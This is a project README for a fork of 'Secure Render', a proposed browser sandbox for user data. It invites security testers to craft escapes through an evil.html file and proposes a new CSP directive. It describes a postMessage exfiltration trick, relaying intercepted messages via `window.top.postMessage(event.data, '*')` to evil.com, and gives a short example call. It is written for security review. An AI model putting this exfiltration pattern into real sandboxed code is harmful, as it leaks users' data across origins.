## THIS README IS OUT OF DATE, WAS INTENDED FOR THE SECURITY TEAM REVIEW, AND THE BELOW CODE DEMOS ARE NOT COMPATIBLE WITH THE NEW LAYOUT ENGINE.

 > This is a fork of the Secure Render project, meant for gaming. It does not contain the `evil.html` demo, please contact @marknadal for the main Secure Render code.

To read about the `postMessage` exploit that bypasses strict CSP/CORS policies, please see (4). Otherwise, this demo is intended to serve as a prototype for a new proposed browser standard called Secure Render.

# Secure Render

Cross Origin Resource Sharing will become even more prevalent as commercial teams attempt to implement metaverse-like asset sharing. The problem is that these assets will likely be user generated content, and after the initial user honeymoon stage as faded, people will start complaining about the rampant privacy implications.

Secure Render solves this, it is a network isolated runtime that only allows game assets, app logic, and user data to go into the browser, but nothing can come out. Apps can instantly show a user's name or existing 3d avatar on page load without any login or prior registration needed, yet the app's domain/origin itself cannot access the data. Multiple apps can stream resources in, but only blindly, no request or message can come out of Secure Render, conditional or not.

This is done by creating a new special origin, reserved for the user, and heavily relying upon existing CSP/CORS and sandbox isolation features. As a result, the security of these features is critical. Nothing more is provided by Secure Render, making prototype implementation and its polyfill shim easy, however needs to be bulletproof tested with high audit scrutiny.

# Instructions

The goal is to modify `evil.html`, which gets injected into Secure Render, to have evil code that escapes data to the outside.

A couple examples (that don't work anymore) have already been provided, like by having the app listen to postMessage events and then injecting sneaky ways of calling `window.top.postMessage('buaha', '*')`.

 > Note: Modifying any other file is not valid for testing exploits, although for fixing exploits and contributing PRs, of course!

Secure Render should be a browser feature, so we have implemented code that behaves simultaneously as a browser extension (Manifest v2 privileged) and a polyfill shim using the exact same script.

Read the files in this order:

1. `manifest.json` to review the CORS/CSP settings, or for the polyfill shim you will need to `npx serve` a static server which will automatically use `serve.json` headers. The extension lets a user have their own security context, but browsers require an origin if using the polyfill shim, so we ask browsers to start blocking securerender.org like how the extension already redirects it to example.org to prevent server exploits.

2. `content.js` gets run on every page, or is an SDK an app developer can use until users upgrade to a more secure browser. This checks for clickjacking and kills Secure Render if any non-Secure Render DOM manipulation is detected. It transfers the untrusted app's code out of the app's domain origin security context and into Secure Render as a fullscreen iframe.

3. `enclave.html` is `v1.js` receives the app code and transfers it into another fullscreen iframe with a null sandbox origin. This file acts as the "server" to Secure Render, providing it with user data and resource allocation.

4. `sandbox.html` is `sandbox.js` that if browsers are doing their CSP/CORS job correctly, is a completely network isolated runtime - but wait, they don't, `postMessage` can bypass CSP/CORS entirely by specifying any origin as the 2nd parameter. **This should be considered a serious bug and vulnerable exploit**, MDN and W3 spec do not warn about this as an exception to CSP directives, and separately in articles referencing iframes, actively encourage using sandbox for untrusted code. Yet any such untrusted code can mount itself to `window.onmessage` then exfiltrate all next messages (which documentation often references as unsanitized user input, like posts and blogs) to `window.top.postMessage(event.data, "*")` evil.com violating strict CSP directives. Don't believe me? Just add 'unsafe-inline' (no, you can't tell me "ha! It is unsafe!" because sandbox tutorials tell you that you have to do this or eval the code) to every CSP in `manifest.json, server.json, v1.js` and restart `npx serve` and refresh app. You'll see EVIL happily prints. **We propose a "message-src 'self' http://example.com;" directive immediately be adopted that app developers can opt into to override all postMessage based APIs,** it is impossible to monkeypatch because `window.top.postMessage = null` is treated as CORS violation and ignored, meaning browsers actually lock developers into insecure defaults they cannot opt out of.

You're good! Fire that `npx serve` up or developer mode extension, and open `evil.html` from file:// or wherever, and start hacking cracking!

# User Origin

We propose the spec consider reusing a WebCrypto ECDSA keypair as a `pub:ECDSA/SHA-256;base64,UddLkREU9yE9OrOEdOFtixNevGXJ7ujhfCHcvhdlZPI.e6jGEa1mF3zuLOEMKd7pFdIpKVrdFGZSUEfetY2laMk` origin (`Xpart.Ypart`). We also advise browser vendors to block all requests to securerender.org as being reserved like example.com to mitigate DNS or server compromise, nobody should be allowed to own it.

## Donate

I run Open Source projects with 50 million monthly downloads, with no stupid scamcoin or toxic (A)GPL virus. I build this tech out of a moral obligation to protect people's privacy (I've been a single dad of 2 kids, I want the future to be safe for them). I do not profit from any of this, and the explosion of growth has crushed my ability to keep up helping support developers in my community. Corporate [sponsorship](https://github.com/sponsors/amark) would be appreciated, or offering any free/volunteer security audit. Thank you!